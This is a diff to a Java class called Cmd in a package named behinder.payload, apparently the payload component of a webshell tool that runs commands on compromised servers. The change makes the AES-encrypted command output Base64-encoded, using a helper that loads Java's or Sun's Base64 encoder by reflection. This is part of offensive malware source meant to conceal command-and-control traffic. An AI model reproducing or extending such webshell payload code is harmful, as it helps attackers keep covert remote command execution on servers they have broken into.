@@ -1,6 +1,7 @@
 package net.rebeyond.behinder.payload.java;
 
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.InputStreamReader;
 import java.lang.reflect.Method;
 import java.nio.charset.Charset;
@@ -111,7 +112,30 @@ public class Cmd {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      return this.base64encode(bos.toByteArray()).getBytes();
+   }
+
+   private String base64encode(byte[] data) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+
+      Class Base64;
+      try {
+         this.getClass();
+         Base64 = Class.forName("java.util.Base64");
+         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
+      } catch (Throwable var7) {
+         this.getClass();
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Object Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
